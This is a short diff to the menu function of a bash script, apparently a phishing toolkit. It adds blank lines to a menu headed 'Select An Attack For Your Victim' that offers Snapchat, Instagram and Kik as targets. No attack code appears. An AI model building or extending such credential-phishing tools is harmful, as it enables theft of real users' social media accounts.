@@ -341,9 +341,11 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${GREEN} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${GREEN}
+		
 		${RED}[${WHITE}01${RED}]${CYAN} Snapchat
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram
 		${RED}[${WHITE}03${RED}]${CYAN} Kik
+		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
 	EOF
